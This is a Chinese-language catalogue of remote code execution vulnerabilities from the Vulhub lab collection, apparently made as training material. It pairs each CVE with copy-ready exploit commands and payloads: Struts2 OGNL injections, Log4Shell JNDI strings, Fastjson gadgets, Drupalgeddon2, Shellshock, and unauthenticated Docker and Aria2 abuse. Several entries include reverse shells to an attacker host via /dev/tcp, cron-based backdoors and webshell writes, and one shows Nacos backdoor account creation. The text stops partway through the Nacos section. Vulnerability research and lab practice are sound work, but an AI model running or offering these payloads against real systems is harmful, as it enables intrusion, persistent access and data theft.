# Vulhub RCE 漏洞清单

> 生成时间：2026-03-30
> 来源目录：vulhub-master
> 漏洞类型：远程代码执行（RCE）

---

## 目录

1. [Apache ActiveMQ](#apache-activemq)
2. [Apache Druid](#apache-druid)
3. [Apache HTTP Server](#apache-http-server)
4. [Apache OFBiz](#apache-ofbiz)
5. [Apache Shiro](#apache-shiro)
6. [Apache Solr](#apache-solr)
7. [Apache Struts2](#apache-struts2)
8. [Aria2](#aria2)
9. [Bash (Shellshock)](#bash-shellshock)
10. [Confluence](#confluence)
11. [Docker](#docker)
12. [Drupal](#drupal)
13. [Elasticsearch](#elasticsearch)
14. [Fastjson](#fastjson)
15. [Flask / Jinja2 SSTI](#flask--jinja2-ssti)
16. [JBoss](#jboss)
17. [Jenkins](#jenkins)
18. [Apache Kafka](#apache-kafka)
19. [Laravel](#laravel)
20. [Log4j2](#log4j2)
21. [Nacos](#nacos)
22. [Node.js](#nodejs)
23. [Openfire](#openfire)
24. [PHP](#php)
25. [Rails](#rails)
26. [Redis](#redis)
27. [RocketMQ](#rocketmq)
28. [SaltStack](#saltstack)
29. [Spring Framework](#spring-framework)
30. [Supervisor](#supervisor)
31. [ThinkPHP](#thinkphp)
32. [Apache Tomcat](#apache-tomcat)
33. [Oracle WebLogic](#oracle-weblogic)
34. [XXL-JOB](#xxl-job)

---

## Apache ActiveMQ

### CVE-2023-46604 — OpenWire 反序列化 RCE

- **影响版本：** Apache ActiveMQ < 5.18.2
- **漏洞类型：** 反序列化 / ClassPathXmlApplicationContext 远程加载
- **目录：** `activemq/CVE-2023-46604`
- **出处：** `/Users/illya/Projects/vulhub-master/activemq/CVE-2023-46604/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/activemq/CVE-2023-46604/poc.py`
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/activemq/CVE-2023-46604/poc.xml`

**漏洞描述：**
OpenWire 协议中，攻击者可以发送恶意数据包，触发 `ClassPathXmlApplicationContext` 加载远程 XML Bean 定义文件，进而执行任意命令。

**PoC：**

```python
# poc.py — 发送恶意 OpenWire 数据包
# 1. 启动 HTTP 服务托管恶意 XML：
# poc.xml 内容示例:
# <beans>
#   <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
#     <constructor-arg><list><value>touch</value><value>/tmp/activeMQ-RCE-success</value></list></constructor-arg>
#   </bean>
# </beans>

# 2. 运行 poc.py:
python3 poc.py -i <target-ip> -p 61616 --xml http://<attacker-ip>:8888/poc.xml
```

---

### CVE-2022-41678 — Jolokia MBean 认证后 RCE

- **影响版本：** Apache ActiveMQ < 5.16.5, < 5.17.3
- **漏洞类型：** 认证后 MBean 任意文件写入（Webshell）
- **目录：** `activemq/CVE-2022-41678`
- **出处：** `/Users/illya/Projects/vulhub-master/activemq/CVE-2022-41678/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/activemq/CVE-2022-41678/poc.py`

**漏洞描述：**
通过 Jolokia `/api/jolokia` 端点，使用 Log4j2 的 `LoggerContextAdminMBean` 或 JDK 11 的 `FlightRecorderMXBean`，可将 JSP Webshell 写入服务器任意路径。

**PoC：**

```bash
# 使用 admin:admin 默认凭据，利用 poc.py 写入 Webshell
python3 poc.py -u admin -p admin -t http://<target-ip>:8161

# 访问 Webshell
curl http://<target-ip>:8161/api/shell.jsp?cmd=id
```

---

## Apache Druid

### CVE-2021-25646 — 嵌入式 JavaScript RCE

- **影响版本：** Apache Druid <= 0.20.0
- **漏洞类型：** JavaScript 代码注入
- **目录：** `apache-druid/CVE-2021-25646`
- **出处：** `/Users/illya/Projects/vulhub-master/apache-druid/CVE-2021-25646/README.md`

**漏洞描述：**
Druid 在 sampler 请求中允许强制执行用户提供的 JavaScript，即使 JavaScript 执行在默认情况下被禁用。

**PoC：**

```bash
curl -X POST http://<target-ip>:8888/druid/indexer/v1/sampler \
  -H 'Content-Type: application/json' \
  -d '{
    "type": "index",
    "spec": {
      "type": "index",
      "ioConfig": {
        "type": "index",
        "inputSource": {
          "type": "inline",
          "data": "{\"isRobot\":true,\"channel\":\"test\"}"
        },
        "inputFormat": {
          "type": "javascript",
          "function": "function(str) { var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()); var b = \"\"; while (a.hasNextLine()) b += a.nextLine(); return [b]; }",
          "enabled": true
        }
      },
      "dataSchema": {
        "dataSource": "test",
        "timestampSpec": {"column": "!!!__time", "missingValue": "2010-01-01T00:00:00Z"},
        "dimensionsSpec": {}
      }
    },
    "samplerConfig": {"numRows": 10}
  }'
```

---

## Apache HTTP Server

### CVE-2021-41773 — 路径穿越 + CGI RCE

- **影响版本：** Apache HTTP Server 2.4.49
- **漏洞类型：** 路径规范化绕过 + CGI 命令执行
- **目录：** `httpd/CVE-2021-41773`
- **出处：** `/Users/illya/Projects/vulhub-master/httpd/CVE-2021-41773/README.md`

**漏洞描述：**
路径规范化缺陷导致可访问 DocumentRoot 之外的文件，在 CGI 启用时可执行任意命令。

**PoC：**

```bash
# 文件读取
curl --path-as-is http://<target-ip>:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 命令执行（需要 CGI 启用）
curl --path-as-is --data "echo;id" 'http://<target-ip>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'

# 反弹 Shell
curl --path-as-is --data "echo;bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" \
  'http://<target-ip>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'

# 实现注意：客户端必须保留原始路径编码（等价 curl --path-as-is），否则可能被自动规范化导致 PoC 失败
```

---

## Apache OFBiz

### CVE-2020-9496 — XMLRPC 反序列化 RCE

- **影响版本：** OFBiz 17.12.01
- **漏洞类型：** Java 反序列化
- **目录：** `ofbiz/CVE-2020-9496`
- **出处：** `/Users/illya/Projects/vulhub-master/ofbiz/CVE-2020-9496/README.md`

**PoC：**

```bash
# 生成 ysoserial payload 并发送
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" | base64 > payload.b64

curl -X POST https://<target-ip>:443/webtools/control/xmlrpc \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params><param><value><struct><member>
    <name>test</name>
    <value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
      BASE64_PAYLOAD_HERE
    </serializable></value>
  </member></struct></value></param></params>
</methodCall>'
```

---

### CVE-2023-49070 — XMLRPC 反序列化 + 路径绕过 RCE

- **影响版本：** OFBiz 18.12.09
- **漏洞类型：** Java 反序列化（认证绕过）
- **目录：** `ofbiz/CVE-2023-49070`
- **出处：** `/Users/illya/Projects/vulhub-master/ofbiz/CVE-2023-49070/README.md`

**PoC：**

```bash
# 路径绕过 + 反序列化，无需认证
curl -X POST 'https://<target-ip>:443/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y' \
  -H 'Content-Type: application/xml' \
  --data '<xmlrpc-payload-with-ysoserial>'
```

---

### CVE-2023-51467 — Groovy 表达式注入 RCE（无需认证）

- **影响版本：** OFBiz 18.12.10
- **漏洞类型：** Groovy 代码执行
- **目录：** `ofbiz/CVE-2023-51467`
- **出处：** `/Users/illya/Projects/vulhub-master/ofbiz/CVE-2023-51467/README.md`

**PoC：**

```bash
curl -k -X POST \
  'https://<target-ip>:8443/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "groovyProgram=throw+new+Exception('id'.execute().text);"
```

---

### CVE-2024-38856 — Groovy 注入 Unicode 绕过 RCE

- **影响版本：** OFBiz 18.12.14
- **漏洞类型：** Groovy 代码执行（Unicode 绕过）
- **目录：** `ofbiz/CVE-2024-38856`
- **出处：** `/Users/illya/Projects/vulhub-master/ofbiz/CVE-2024-38856/README.md`

**PoC：**

```http
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: <target-ip>:8443
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ

------WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Disposition: form-data; name="groovyProgram"

throw new Exception('id'.\u0065xecute().text);
------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--
```

---

## Apache Shiro

### CVE-2016-4437 — RememberMe 反序列化 RCE

- **影响版本：** Apache Shiro <= 1.2.4
- **漏洞类型：** Java 反序列化（默认密钥）
- **目录：** `shiro/CVE-2016-4437`
- **出处：** `/Users/illya/Projects/vulhub-master/shiro/CVE-2016-4437/README.md`

**漏洞描述：**
Shiro 使用默认 AES 密钥加密 rememberMe Cookie，攻击者构造恶意序列化对象后以默认密钥加密并发送，服务端反序列化时触发 RCE。

**PoC：**

```bash
# 1. 生成序列化 payload
java -jar ysoserial-master.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser

# 2. 用 Shiro 默认密钥 (kPH+bIxk5D2deZiIxcaaaA==) 加密并 Base64 编码后设置为 rememberMe Cookie
# 使用工具: https://github.com/insightglacier/Shiro_exploit

python shiro_exploit.py -t http://<target-ip>/ -p "touch /tmp/shiro_pwned"
```

---

## Apache Solr

### CVE-2017-12629 — RunExecutableListener RCE

- **影响版本：** Apache Solr < 7.1.0
- **漏洞类型：** 任意命令执行（通过 Listener 配置）
- **目录：** `solr/CVE-2017-12629-RCE`
- **出处：** `/Users/illya/Projects/vulhub-master/solr/CVE-2017-12629-RCE/README.md`

**PoC：**

```bash
# 步骤 1：添加 RunExecutableListener
curl -X POST http://<target-ip>:8983/solr/demo/config \
  -H 'Content-Type: application/json' \
  -d '{
    "add-listener": {
      "event": "postCommit",
      "name": "exec",
      "class": "solr.RunExecutableListener",
      "exe": "sh",
      "dir": "/bin/",
      "args": ["-c", "touch /tmp/solr_pwned"]
    }
  }'

# 步骤 2：触发 Listener（提交更新）
curl -X POST http://<target-ip>:8983/solr/demo/update \
  -H 'Content-Type: application/json' \
  -d '[{"id": "trigger"}]'
```

---

## Apache Struts2

### S2-005 (CVE-2010-1870) — OGNL 参数名注入

- **影响版本：** Struts 2.0.0 - 2.1.8.1
- **目录：** `struts2/s2-005`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-005/README.md`

**PoC：**

```
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: <target-ip>:8080
```

---

### S2-007 — 表单验证 OGNL 注入

- **影响版本：** Struts 2.0.0 - 2.2.3
- **目录：** `struts2/s2-007`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-007/README.md`

**PoC：**

```
# age 字段传入 OGNL payload
age=' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

---

### S2-032 (CVE-2016-3081) — DMI OGNL 注入

- **影响版本：** Struts 2.3.20 - 2.3.28
- **目录：** `struts2/s2-032`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-032/README.md`

**PoC：**

```
GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close()&pp=%5C%5Ca&ppp=%20&encoding=UTF-8&cmd=id HTTP/1.1
Host: <target-ip>:8080
```

---

### S2-045 (CVE-2017-5638) — Content-Type OGNL 注入

- **影响版本：** Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
- **目录：** `struts2/s2-045`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-045/README.md`

**PoC：**

```http
POST / HTTP/1.1
Host: <target-ip>:8080
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data
Content-Length: 0
```

---

### S2-052 — REST API XML 反序列化 RCE

- **影响版本：** Struts 2.1.2 - 2.3.33, 2.5 - 2.5.12
- **目录：** `struts2/s2-052`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-052/README.md`

**PoC：**

```http
POST /orders/3/edit HTTP/1.1
Host: <target-ip>:8080
Content-Type: application/xml

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command><string>/bin/sh</string><string>-c</string><string>touch /tmp/s2-052</string></command>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry>
</map>
```

---

### S2-053 — Freemarker 模板 OGNL 注入

- **影响版本：** Struts 2.0.1 - 2.3.33, 2.5 - 2.5.10
- **目录：** `struts2/s2-053`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-053/README.md`

**PoC（POST body）：**

```
name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

---

### S2-057 (CVE-2018-11776) — Namespace OGNL 注入

- **影响版本：** Struts <= 2.3.34, 2.5.16
- **目录：** `struts2/s2-057`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-057/README.md`

**PoC：**

```bash
curl http://<target-ip>:8080/struts2-showcase/%24%7B233%2a233%7D/actionChain1.action
# 返回 54289 表示漏洞存在

# RCE payload:
curl "http://<target-ip>:8080/struts2-showcase/%24%7B%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c@java.lang.Runtime@getRuntime().exec('touch%20/tmp/s2-057')%7D/actionChain1.action"
```

---

### S2-059 (CVE-2019-0230) — 标签属性二次 OGNL 求值

- **影响版本：** Struts 2.0.0 - 2.5.20
- **目录：** `struts2/s2-059`
- **出处：** `/Users/illya/Projects/vulhub-master/struts2/s2-059/README.md`

**PoC（POST body）：**

```
id=%25%7b%28%23context%3d%23attr%5b%27struts.valueStack%27%5d.context%29.%28%23context.setMemberAccess%28@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%29.%28@java.lang.Runtime@getRuntime%28%29.exec%28%27touch+/tmp/s2-059%27%29%29%7d
```

---

## Aria2

### 未授权 RPC 任意文件写入 RCE

- **漏洞类型：** 未授权访问 / 任意文件写入
- **目录：** `aria2/rce`
- **出处：** `/Users/illya/Projects/vulhub-master/aria2/rce/README.md`

**PoC：**

```bash
# 通过 JSON-RPC 接口下载恶意 cron 任务到 /etc/cron.d/
curl http://<target-ip>:6800/jsonrpc \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0",
    "method": "aria2.addUri",
    "id": 1,
    "params": [
      ["http://<attacker-ip>/shell.txt"],
      {"dir": "/etc/cron.d", "out": "backdoor"}
    ]
  }'

# shell.txt 内容（写入到 cron）:
# * * * * * root bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

---

## Bash (Shellshock)

### CVE-2014-6271 — Shellshock CGI 命令注入

- **影响版本：** Bash <= 4.3
- **漏洞类型：** 环境变量函数定义解析命令注入
- **目录：** `bash/CVE-2014-6271`
- **出处：** `/Users/illya/Projects/vulhub-master/bash/CVE-2014-6271/README.md`
- **靶场 CGI 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/bash/CVE-2014-6271/victim.cgi`
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/bash/CVE-2014-6271/safe.cgi`

**PoC：**

```bash
# 通过 User-Agent 触发
curl -H "User-Agent: () { :; }; echo; /bin/id" http://<target-ip>/cgi-bin/test.cgi

# 通过 Referer 触发
curl -H "Referer: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" \
  http://<target-ip>/cgi-bin/test.cgi
```

---

## Confluence

### CVE-2023-22527 — OGNL 注入无需认证 RCE

- **影响版本：** Confluence Data Center & Server 8.0 - 8.5.3
- **漏洞类型：** OGNL 注入
- **目录：** `confluence/CVE-2023-22527`
- **出处：** `/Users/illya/Projects/vulhub-master/confluence/CVE-2023-22527/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:8090/template/aui/text-inline.vm \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'label=\u0027+#request[\u0027.KEY_velocity.struts2.context\u0027].internalGet(\u0027ognl\u0027).findValue(#parameters.x[0],{})' \
  --data-urlencode 'x=@freemarker.template.utility.Execute@exec({"id"})'
```

---

## Docker

### 未授权 API — 挂载主机文件系统 RCE

- **漏洞类型：** 未授权 Docker API 访问
- **目录：** `docker/unauthorized-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/docker/unauthorized-rce/README.md`
- **靶场环境文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/docker/unauthorized-rce/docker-entrypoint.sh`

**PoC：**

```python
import docker

# 连接未授权暴露的 Docker daemon (TCP 2375)
client = docker.DockerClient(base_url='tcp://<target-ip>:2375')

# 挂载主机 /etc，写入 crontab 反弹 Shell
client.containers.run(
    'alpine:latest',
    'sh -c "echo \'* * * * * root bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\' >> /tmp/etc/crontabs/root"',
    volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}},
    remove=True
)
```

---

## Drupal

### CVE-2018-7600 (Drupalgeddon2) — Form API RCE

- **影响版本：** Drupal 7 < 7.58, 8 < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1
- **漏洞类型：** PHP 代码执行（`#post_render` 回调）
- **目录：** `drupal/CVE-2018-7600`
- **出处：** `/Users/illya/Projects/vulhub-master/drupal/CVE-2018-7600/README.md`

**PoC：**

```bash
curl -X POST \
  'http://<target-ip>:80/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

---

## Elasticsearch

### CVE-2015-1427 — Groovy 沙箱逃逸 RCE

- **影响版本：** Elasticsearch < 1.3.8, < 1.4.3
- **漏洞类型：** Groovy 脚本沙箱绕过
- **目录：** `elasticsearch/CVE-2015-1427`
- **出处：** `/Users/illya/Projects/vulhub-master/elasticsearch/CVE-2015-1427/README.md`

**PoC：**

```bash
# 方法一：Java 反射
curl -X POST http://<target-ip>:9200/_search?pretty \
  -H 'Content-Type: application/json' \
  -d '{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }
      }
    },
    "script_fields": {
      "command": {
        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
      }
    }
  }'

# 方法二：Groovy 直接执行
curl -X POST http://<target-ip>:9200/_search?pretty \
  -H 'Content-Type: application/json' \
  -d '{
    "script_fields": {
      "result": {
        "script": "def command=\"id\"; def res=command.execute().text; res"
      }
    }
  }'
```

---

## Fastjson

### 1.2.24 — JNDI 注入 RCE (CVE-2017-18349)

- **影响版本：** Fastjson 1.2.24
- **漏洞类型：** JSON 反序列化 JNDI 注入
- **目录：** `fastjson/1.2.24-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/fastjson/1.2.24-rce/README.md`

**PoC：**

```bash
# 步骤 1：启动恶意 RMI 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.RMIRefServer "http://<attacker-ip>:8888/#TouchFile" 9999

# 步骤 2：发送 Fastjson payload
curl -X POST http://<target-ip>:8080/ \
  -H 'Content-Type: application/json' \
  -d '{
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://<attacker-ip>:9999/TouchFile",
      "autoCommit": true
    }
  }'
```

---

### 1.2.47 — 白名单绕过 JNDI 注入 RCE

- **影响版本：** Fastjson < 1.2.48
- **漏洞类型：** JSON 反序列化绕过白名单
- **目录：** `fastjson/1.2.47-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/fastjson/1.2.47-rce/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:8080/ \
  -H 'Content-Type: application/json' \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://<attacker-ip>:1389/Exploit",
      "autoCommit": true
    }
  }'
```

---

## Flask / Jinja2 SSTI

### Server-Side Template Injection RCE

- **影响版本：** Flask (Jinja2)
- **漏洞类型：** SSTI 模板注入
- **目录：** `flask/ssti`
- **出处：** `/Users/illya/Projects/vulhub-master/flask/ssti/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/flask/ssti/src/app.py`

**PoC：**

```bash
# 验证 SSTI
curl "http://<target-ip>:8080/?name={{233*233}}"
# 返回 54289 说明存在漏洞

# RCE — 通过 __subclasses__ 查找 eval
curl "http://<target-ip>:8080/?name=%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__()%25%7D%7B%25+if+c.__name__+%3D%3D+'catch_warnings'+%25%7D%7B%25+for+b+in+c()._module.__builtins__.values()%25%7D%7B%25+if+b.__class__+%3D%3D+%5B%5D.__class__+and+'eval'+in+b.keys()%25%7D%7B%7Bb%5B'eval'%5D('__import__(\"os\").popen(\"id\").read()')%7D%7D%7B%25+endif+%25%7D%7B%25+endfor+%25%7D%7B%25+endif+%25%7D%7B%25+endfor+%25%7D"
```

---

## JBoss

### CVE-2017-12149 — HttpInvoker 反序列化 RCE

- **影响版本：** JBoss AS 5.x / 6.x
- **漏洞类型：** Java 反序列化
- **目录：** `jboss/CVE-2017-12149`
- **出处：** `/Users/illya/Projects/vulhub-master/jboss/CVE-2017-12149/README.md`

**PoC：**

```bash
# 使用 ysoserial 生成 CommonsCollections 序列化 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/jboss_pwned" > payload.ser

# POST 到 /invoker/readonly
curl -X POST http://<target-ip>:8080/invoker/readonly \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @payload.ser
```

---

## Jenkins

### CVE-2017-1000353 — 未授权反序列化 RCE

- **影响版本：** Jenkins <= 2.56, LTS <= 2.46.1
- **漏洞类型：** Java 反序列化（绕过黑名单）
- **目录：** `jenkins/CVE-2017-1000353`
- **出处：** `/Users/illya/Projects/vulhub-master/jenkins/CVE-2017-1000353/README.md`

**PoC：**

```bash
# 使用 CVE-2017-1000353 工具
python exploit.py <target-ip> 8080 "touch /tmp/jenkins_pwned"
```

---

## Apache Kafka

### CVE-2023-25194 — sasl.jaas.config JNDI 注入 RCE

- **影响版本：** Kafka clients < 3.3.2
- **漏洞类型：** JNDI 注入（通过 Kafka Connect REST API）
- **目录：** `kafka/CVE-2023-25194`
- **出处：** `/Users/illya/Projects/vulhub-master/kafka/CVE-2023-25194/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:8083/connectors \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "exploit",
    "config": {
      "connector.class": "org.apache.kafka.connect.mirror.MirrorSourceConnector",
      "source.cluster.alias": "test",
      "target.cluster.alias": "target",
      "source.cluster.bootstrap.servers": "<attacker-ip>:9092",
      "security.protocol": "SASL_PLAINTEXT",
      "sasl.mechanism": "PLAIN",
      "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://<attacker-ip>:1389/Exploit\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
  }'
```

---

## Laravel

### CVE-2021-3129 — Ignition 调试模式 RCE

- **影响版本：** Laravel < 8.4.2, Ignition < 2.5.2（Debug 模式开启时）
- **漏洞类型：** PHP 反序列化（通过 Phar）
- **目录：** `laravel/CVE-2021-3129`
- **出处：** `/Users/illya/Projects/vulhub-master/laravel/CVE-2021-3129/README.md`

**PoC：**

```bash
# 使用 phpggc 生成 Phar payload
phpggc --phar phar -o /tmp/exploit.phar Laravel/RCE5 "system" "id"

# 多次 POST 将 Phar 内容写入 log 文件，最终触发反序列化
python3 exploit.py http://<target-ip>
```

---

## Log4j2

### CVE-2021-44228 (Log4Shell) — JNDI 注入 RCE

- **影响版本：** Log4j2 < 2.15.0
- **漏洞类型：** JNDI 查找注入
- **目录：** `log4j/CVE-2021-44228`
- **出处：** `/Users/illya/Projects/vulhub-master/log4j/CVE-2021-44228/README.md`

**PoC：**

```bash
# 启动 JNDI 服务（marshalsec）
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://<attacker-ip>:8888/#Exploit"

# 发送 Log4Shell payload（通过请求头注入日志）
curl -H 'X-Api-Version: ${jndi:ldap://<attacker-ip>:1389/Exploit}' \
  http://<target-ip>:8080/

# 常见注入点：
# - User-Agent: ${jndi:ldap://<attacker-ip>/a}
# - X-Forwarded-For: ${jndi:ldap://<attacker-ip>/a}
# - 任何会被 log.error()/log.info() 记录的字段
```

---

## Nacos

### CVE-2021-29441 — User-Agent 认证绕过

- **影响版本：** Nacos < 1.4.1
- **漏洞类型：** 认证绕过（结合用户管理 API 创建后门账号）
- **目录：** `nacos/CVE-2021-29441`
- **出处：** `/Users/illya/Projects/vulhub-master/nacos/CVE-2021-29441/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/nacos/CVE-2021-29441/poc.py`

**PoC：**

```bash
# 绕过认证，列出用户
curl -H "User-Agent: Nacos-Server" \
  'http://<target-ip>:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'

# 创建管理员账号
curl -X POST -H "User-Agent: Nacos-Server" \
  'http://<target-ip>:8848/nacos/v1/auth/users' \
  -d 'username=attacker&password=password123'
```

---

### CVE-2021-29442 — Derby SQL RCE

- **影响版本：** Nacos < 1.4.1
- **漏洞类型：** SQL 注入导致代码执行
- **目录：** `nacos/CVE-2021-29442`
- **出处：** `/Users/illya/Projects/vulhub-master/nacos/CVE-2021-29442/README.md`
- **PoC 文件：**
